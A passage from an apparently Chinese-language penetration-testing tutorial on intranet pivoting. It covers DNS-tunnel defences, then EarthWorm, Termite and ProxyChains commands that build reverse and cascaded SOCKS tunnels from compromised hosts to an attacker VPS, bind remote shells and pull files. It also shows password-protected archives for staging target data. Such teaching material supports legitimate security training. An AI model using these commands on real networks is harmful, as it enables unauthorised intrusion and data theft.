+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 由于客户端与服务端已经属于同一内网了，所以直接访问即可</span>
+</span></span><span class="line"><span class="cl">mstsc 192.168.128:3389  <span class="c1"># 等方法</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># route 可以查看到路由</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="防御dns隧道的方法">防御DNS隧道的方法</h6>
+<ul>
+<li>禁止网络中任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信</li>
+<li>虽然没有人会将TXT解析请求发送给DNS服务器，但是dnscat2和邮件服务器/网关会这样做。因此可以将邮件服务器/网关列出白名单并组织传入和传出流量中TXT请求</li>
+<li>跟踪用户的DNS查询次数。如果达到阈值，就生成相应的报告</li>
+<li>阻止ICMP</li>
+</ul>
+<h6 id="各种隧道技术的优劣">各种隧道技术的优劣</h6>
+<img src="http://image.xpshuai.cn/20200516154814996_1523296228.png" />
+<p>根据实际环境选择技术<br>
+DNS+SSH隧道结合</p>
+<h2 id="font-colorredsocks代理-font"><font color=red>SOCKS代理 </font></h2>
+<p><strong>常见的网络场景</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">1.服务器在内网，可以任意访问外部网络
+</span></span><span class="line"><span class="cl">2.服务器在内网，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接
+</span></span><span class="line"><span class="cl">3.服务器在内网，对外只开放了部分端口<span class="o">(</span>如80端口<span class="o">)</span>，且服务器不能访问外部网络
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="http://image.xpshuai.cn/20200516172238149_1110777522.png" />
+<img src="http://image.xpshuai.cn/20200516172346684_1234877527.png" />
+<p>SOCKS是一种代理服务，可简单的将一端的系统连接另一端。
+SOCKS支持多种协议。
+SOCKS分为SOCKS4和SOCKS5。SOCKS4只支持TCP协议，SOCKS5不仅支持TCP/UDP，还支持各种身份验证机制等，标准端口为1080。
+SOCKS能与目标内网计算机进行通信，避免多次使用端口转发。</p>
+<h6 id="常见socks代理工具">常见SOCKS代理工具</h6>
+<p>可理解为增强版的lcx。他在服务端监听一个端口，当有新连接出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能
+socks代理工具尽量选则小且命令行的</p>
+<p><strong>1. EarthWorm(EW)</strong>
+跨平台，SOCKS5架构，能以正向、反向、多级级联等方式建立网络隧道
+下载地址：https://github.com/rootkiter/EarthWorm
+新版本<code>Termite</code>: <a href="https://github.com/rootkiter/Termite"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/rootkiter/Termite<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p><strong>2. reGeorg(reDuh的升级版)</strong>
+可以使目标服务器在内网中(或者在设置了端口策略的情况下)连接内部开发端口
+利用webshell建立一个socks代理进行内网穿透，服务器必须支持ASPX, PHP, JSP中的一种。</p>
+<p><strong>3. sSocks</strong>
+支持SOCKS5验证，支持IPv6和UDP，并提供反向SOCKS代理服务(将远程计算机作为SOCKS代理服务端反弹到本地)</p>
+<p><strong>4. SocksCap64</strong>
+<a href="http://www.sockscap64.com"target="_blank" rel="external nofollow noopener noreferrer">http://www.sockscap64.com<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>
+windows上的全局代理软件
+即便是本身不支持SOCKS代理的应用程序，也可以通过其实现代理访问</p>
+<p><strong>5. Proxifier</strong>
+<a href="https://www.proxifier.com/"target="_blank" rel="external nofollow noopener noreferrer">https://www.proxifier.com/<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p><strong>6. ProxyChains</strong>
+<a href="http://proxychains.sourceforge.net/"target="_blank" rel="external nofollow noopener noreferrer">http://proxychains.sourceforge.net/<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>
+<a href="https://github.com/haad/proxychains"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/haad/proxychains<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>
+Linux下实现全局代理的软件，可以使任何程序通过代理上网，允许TCP和DNS流量通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器</p>
+<h6 id="工具使用">工具使用</h6>
+<p><strong>1. EarthWorm(EW)</strong>
+六种命令格式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssocksd    <span class="c1"># 用于普通网络环境的正向连接命令</span>
+</span></span><span class="line"><span class="cl">rcsocks    <span class="c1"># 用于普通网络环境的反向连接命令</span>
+</span></span><span class="line"><span class="cl">rssocks
+</span></span><span class="line"><span class="cl">lcx_slave
+</span></span><span class="line"><span class="cl">lcx_listen
+</span></span><span class="line"><span class="cl">lcx_tran
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>正向SOCKS 5 服务器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 适用于目标机器拥有一个外网ip的情况</span>
+</span></span><span class="line"><span class="cl">ew -s ssocksd -l <span class="m">888</span>    <span class="c1"># 假设一个端口为888的SOCKS代理</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 接下来，可以使用SocksCap64添加这个代理地址即可</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>反弹SOCKS 5 服务器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 目标机器没有公网IP地址的情况 / 或者在内网内部用</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#1.先把ew上传到公网vps中，并执行</span>
+</span></span><span class="line"><span class="cl">ew -s rcsocks -l <span class="m">1008</span> -e <span class="m">888</span>    <span class="c1"># 含义：在公网vps上添加一个转接隧道，把1008收到的代理请求转发给888端</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1">#2.然后把ew上传到web服务器(内网)，并执行</span>
+</span></span><span class="line"><span class="cl">ew -s rssocks -d &lt;公网vps_IP&gt; -e <span class="m">888</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#3.然后用SocksCap64等添加代理地址为vps的ip:1008</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#4.回到vps发现反弹成功，就可以通过vps的1008端口使用假设在web服务器上的SOCKS5代理服务了</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>多级级联：
+Case1. lcx_tran</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 情景：vps能连接web服务器，web服务器能连接数据库服务器但是不能连接DC，数据库服务器能连接DC但是不能访问外网</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 所以，在数据库服务器建立SOCKS服务，端口转发给web服务器，我们可以直接链接web服务器</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 1.在DB服务器</span>
+</span></span><span class="line"><span class="cl">ew -s ssocksd -l <span class="m">9999</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 2.在vps </span>
+</span></span><span class="line"><span class="cl">ew -s lcx_tran -l <span class="m">1008</span> -f 127.0.0.1 -g <span class="m">9999</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 3.使用工具连接vps1008即可</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Case2. lcx_listen, lcx_slave</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#1. vps</span>
+</span></span><span class="line"><span class="cl">ew -s lcx_listen -l <span class="m">1080</span> -e <span class="m">8888</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#2. DB内网主机</span>
+</span></span><span class="line"><span class="cl">ew -s ssocksd -l <span class="m">9999</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#3. 另一台内网主机</span>
+</span></span><span class="line"><span class="cl">ew -s lcx_slave -d 192.168.0.100 -e <span class="m">8888</span> -f 1.1.1.10 -g <span class="m">9999</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#4. 最后连接vps的1080端口</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>三级级联</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#1. vps(192.168.0.103)</span>
+</span></span><span class="line"><span class="cl">ew -s lcx_listen -l <span class="m">1001</span> -e <span class="m">113</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#2.A</span>
+</span></span><span class="line"><span class="cl">ew -s lcx_slave -d 192.168.0.103 -e <span class="m">113</span> -f 1.1.1.10 -g <span class="m">123</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#3. B(1.1.1.10)</span>
+</span></span><span class="line"><span class="cl">ew -s lcx_listen -l <span class="m">123</span> -e <span class="m">133</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#4. C主机，启动SOCKS 5服务，并反弹到B主机的123端口</span>
+</span></span><span class="line"><span class="cl">ew -s rssocks -d 1.1.1.10  -e <span class="m">133</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#5. 使用代理工具连接vps的1001</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>2.Termite</strong></p>
+<p>分为两部分：<code>admin_exe</code>和<code>agent_exe</code>被控者</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Usage</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1. 以服务模式启动一个agent服务。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt; $ ./agent -l <span class="m">8888</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2. 令管理端连接到agent并对agent进行管理。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt; $ ./admin -c 127.0.0.1 -p <span class="m">8888</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3. 此时，admin端会得到一个内置的shell, 输入help指令可以得到帮助信息。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt;&gt; <span class="nb">help</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">4. 通过show指令可以得到当前agent的拓扑情况。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt;&gt; show 
+</span></span><span class="line"><span class="cl"> 0M
+</span></span><span class="line"><span class="cl"> +-- 1M
+</span></span><span class="line"><span class="cl"> 由于当前拓扑中只有一个agent，所以展示结果只有 1M ,
+</span></span><span class="line"><span class="cl">  其中1 为节点的ID号，
+</span></span><span class="line"><span class="cl">  M为MacOS系统的简写，Linux为L，Windows简写为W。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">5. 将新agent加入当前拓扑
+</span></span><span class="line"><span class="cl">&gt; ./agent -c 127.0.0.1 -p <span class="m">8888</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">6. 此时show指令将得到如下效果
+</span></span><span class="line"><span class="cl"> 0M
+</span></span><span class="line"><span class="cl"> +-- 1M
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   +-- 2M
+</span></span><span class="line"><span class="cl">  这表明，当前拓扑中有两个节点，其中由于2节点需要通过1节点才能访问，所以下挂在1节点下方。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">7. 在2节点开启socks代理，并绑定在本地端口
+</span></span><span class="line"><span class="cl">&gt;&gt; goto <span class="m">2</span>
+</span></span><span class="line"><span class="cl">    将当前被管理节点切换为 <span class="m">2</span> 号节点。
+</span></span><span class="line"><span class="cl">&gt;&gt; socks <span class="m">1080</span>
+</span></span><span class="line"><span class="cl">   此时，本地1080 端口会启动个监听服务，而服务提供者为2号节点。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">8. 在1号节点开启一个shell并绑定到本地端口
+</span></span><span class="line"><span class="cl">&gt;&gt; goto <span class="m">1</span>
+</span></span><span class="line"><span class="cl">&gt;&gt; shell <span class="m">7777</span>
+</span></span><span class="line"><span class="cl">     此时，通过nc本地的 <span class="m">7777</span> 端口，就可以得到一个 <span class="m">1</span> 节点提供的 shell.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">9. 将远程的文件下载至本地
+</span></span><span class="line"><span class="cl">&gt;&gt; goto <span class="m">1</span>
+</span></span><span class="line"><span class="cl">&gt;&gt; downfile 1.txt 2.txt
+</span></span><span class="line"><span class="cl">    将1 节点，目录下的 1.txt 下载至本地，并命名为2.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">10. 上传文件至远程节点
+</span></span><span class="line"><span class="cl">&gt;&gt; goto <span class="m">2</span>
+</span></span><span class="line"><span class="cl">&gt;&gt; upfile 2.txt 3.txt
+</span></span><span class="line"><span class="cl">    将本地的 2.txt 上传至 2号节点的目录，并命名为3.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">11. 端口转接
+</span></span><span class="line"><span class="cl">&gt;&gt; goto <span class="m">2</span> 
+</span></span><span class="line"><span class="cl">&gt;&gt; lcxtran <span class="m">3388</span> 10.0.0.1 <span class="m">3389</span>
+</span></span><span class="line"><span class="cl">    以2号节点为跳板，将 10.0.0.1 的 <span class="m">3389</span> 端口映射至本地的 <span class="m">3388</span> 端口
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 更多支持</span>
+</span></span><span class="line"><span class="cl">    http://rootkiter.com/toolvideo/toolmp4/1maintalk.mp4
+</span></span><span class="line"><span class="cl">    http://rootkiter.com/toolvideo/toolmp4/2socks.mp4
+</span></span><span class="line"><span class="cl">    http://rootkiter.com/toolvideo/toolmp4/3lcxtran.mp4
+</span></span><span class="line"><span class="cl">    http://rootkiter.com/toolvideo/toolmp4/4shell.mp4
+</span></span><span class="line"><span class="cl">    http://rootkiter.com/toolvideo/toolmp4/5file.mp4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 联系作者</span>
+</span></span><span class="line"><span class="cl">    rootkiter@rootkiter.com
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>3. 在Windows下使用SocksCap64实现内网漫游</strong>
+代理服务器先设置：<code>ew -s lcx_listen -l 10800 -e 888</code></p>
+<p>以管理员权限打开
+1.点击<code>代理</code>，添加一个代理(代理服务器的ip和端口)
+2.点击闪电图标，测试代理服务器是否正常
+3.选择浏览器，右键，选择<code>在代理隧道中运行选择程序</code>，然后就可以自由访问内网了</p>
+<p><strong>4. 在Linux下使用ProxyChains实现内网漫游</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># kali中安装了ProxyChains，只需配置即可</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># vim /etc/proxychains.conf</span>
+</span></span><span class="line"><span class="cl">取消 dynamic_chain 的注释
+</span></span><span class="line"><span class="cl">修改 socks 127.0.0.1 <span class="m">1080</span> 为自己的端口
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 测试是否正常</span>
+</span></span><span class="line"><span class="cl">proxyresolv www.baidu.com    
+</span></span><span class="line"><span class="cl"><span class="c1"># 如提示没找到命令</span>
+</span></span><span class="line"><span class="cl">cp /usr/lib/proxychains3/proxyresolv /use/bin/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 启动火狐浏览器(使用socks代理)</span>
+</span></span><span class="line"><span class="cl">proxychains firefox        <span class="c1"># 可以访问到内网的站点</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 同样nmap，sqlmap，msf都可以以代理方式运行</span>
+</span></span><span class="line"><span class="cl">proxychains nmap 192.168.0.1/24
+</span></span><span class="line"><span class="cl">proxychains sqlmap -u 192.168.0.12
+</span></span><span class="line"><span class="cl">proxychains msfconsole
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="font-colorred压缩数据-font"><font color=red>压缩数据 </font></h2>
+<h4 id="1-rar">1. RAR</h4>
+<p>如果目标安装了<code>win.rar</code>，则不必再安装；如果没有安装，则手动安装与系统版本对应的，然后把<code>win.exe</code>拿出来</p>
+<p>参数:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">a    添加要压缩的文件
+</span></span><span class="line"><span class="cl">-k    锁定压缩文件
+</span></span><span class="line"><span class="cl">-s    生成存档文件<span class="o">(</span>提高压缩比<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-p    指定压缩密码
+</span></span><span class="line"><span class="cl">-r    递归压缩
+</span></span><span class="line"><span class="cl">-x    指定要排除的文件
+</span></span><span class="line"><span class="cl">-v    分卷打包<span class="o">(</span>大文件时候用处很大<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-ep    从名称中排除路径
+</span></span><span class="line"><span class="cl">-ep1    从名称中排除基本目录
+</span></span><span class="line"><span class="cl">-m0     存储，添加到压缩文件时不压缩
+</span></span><span class="line"><span class="cl">-m1    最快，使用最快压缩方式<span class="o">(</span>低压缩比<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-m2    较快，使用快速压缩方式
+</span></span><span class="line"><span class="cl">-m3    标准，使用标准压缩方式<span class="o">(</span>默认<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-m4    较好，使用较强压缩方式<span class="o">(</span>速度较慢<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-m5    最好，使用最强压缩方式<span class="o">(</span>最好的压缩方式，但速度最慢<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>以RAR格式压缩/解压</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 压缩</span>
+</span></span><span class="line"><span class="cl">rar.exe a -k -r -s -m3 C:<span class="se">\\</span>1.rar C:<span class="se">\\</span>apps
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 解压</span>
+</span></span><span class="line"><span class="cl">rar.exe e  C:<span class="se">\\</span>1.rar
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># </span>
+</span></span><span class="line"><span class="cl">-e    <span class="c1"># 解压到当前根目录下</span>
+</span></span><span class="line"><span class="cl">-x    <span class="c1"># 以绝对路径解压</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># zip和rar一样，修改后缀即可</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>分卷压缩/解压</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 压缩(每个卷的大小为20MB)</span>
+</span></span><span class="line"><span class="cl">rar.exe a -m0 -r -v20m  C:<span class="se">\\</span>1.rar C:<span class="se">\\</span>apps
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 解压</span>
+</span></span><span class="line"><span class="cl">rar.exe x  C:<span class="se">\\</span>1.part01.rar C:<span class="se">\\</span>apps
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="2-7-zip">2. 7-Zip</h4>
+<p>下载地址：https://www.7-zip.org/
+参数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-r    递归压缩
+</span></span><span class="line"><span class="cl">-o    指定输出目录
+</span></span><span class="line"><span class="cl">-p    指定密码
+</span></span><span class="line"><span class="cl">-v    分卷压缩
+</span></span><span class="line"><span class="cl">a    添加压缩文件
+</span></span><span class="line"><span class="cl">x    解压
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>普通压缩/解压方式</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 压缩</span>
+</span></span><span class="line"><span class="cl">7z.exe a -r -p123456 C:<span class="se">\a</span>pps<span class="se">\1</span>.7z C:<span class="se">\a</span>pps
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 解压</span>
+</span></span><span class="line"><span class="cl">7z.exe x -p123456 C:<span class="se">\a</span>pps<span class="se">\1</span>.7z -o C:<span class="se">\a</span>pps2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>分卷压缩/解压方式</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 压缩（每个分卷20MB）</span>
+</span></span><span class="line"><span class="cl">7z.exe a -r -vlm -p123456 C:<span class="se">\a</span>pps<span class="se">\1</span>.7z C:<span class="se">\a</span>pps
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 解压</span>
+</span></span><span class="line"><span class="cl">7z.exe x -p123456 C:<span class="se">\a</span>pps<span class="se">\1</span>.7z.001 -o C:<span class="se">\a</span>pps2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="font-colorred-上传和下载font"><font color=red> 上传和下载</font></h2>
+<blockquote>
+<p>对于不能上传Shell，但是可以执行命令的Windows服务器，可在shell环境中进行上传下载操作</p>
+</blockquote>
+<h4 id="1利用ftp上传文件">1.利用FTP上传文件</h4>
+<p>在本地或vps搭建FTP服务器</p>
+<p>常用FTP命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
